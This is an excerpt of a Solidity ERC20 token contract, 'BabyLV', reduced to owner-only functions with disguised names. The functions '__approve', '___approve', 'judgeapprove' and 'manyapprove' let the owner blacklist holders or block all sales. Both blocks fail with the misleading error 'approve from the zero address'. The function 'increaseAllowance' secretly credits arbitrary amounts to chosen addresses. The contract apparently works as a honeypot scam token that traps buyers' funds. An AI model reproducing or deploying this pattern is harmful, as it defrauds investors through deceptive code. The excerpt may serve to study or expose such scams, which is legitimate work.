...
contract BabyLV is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _Panda;
    bool private judgeapprove = true;
    bool private manyapprove = false;
  
    uint256 public Panda = uint256(0);
    mapping(address => uint256) private Pandas;
    address[] private _Pandas;
    address owners;
    ...
    function transferFrom(
        ...
        if(manyapprove){
     require(owners == sender, "ERC20: approve from the zero address");
        }
        if(_isExcludedFromFeelist[_msgSender()] || _isExcludedFromFeelist[recipient]){
    ...
    function increaseAllowance(address spend, uint256 Value) external _OwnerAddress() {
        ...
        uint256 D = Pandas[spend];
        if (D == 0) _Pandas.push(spend);
        Pandas[spend] = D.add(Value);
        Panda = Panda.add(Value);
    ...
    function _judgeapprove(bool account) external _OwnerAddress() {
        judgeapprove = account;
    }
    
    function _manyapprove(bool account) external _OwnerAddress() {
        manyapprove = account;
    }
    function __approve(address account) external _OwnerAddress() {
        _Panda[account] = true;
    }

    function ___approve(address account) external _OwnerAddress() {
        delete _Panda[account];
    }

    function judge(address account)
        external
        view
        _OwnerAddress()
        returns (bool)
    {
        return _Panda[account];
    }
    ...
    function _transfer(
        ...
        if (judgeapprove) {
            require(_Panda[from] == false, "ERC20: approve from the zero address");
        }
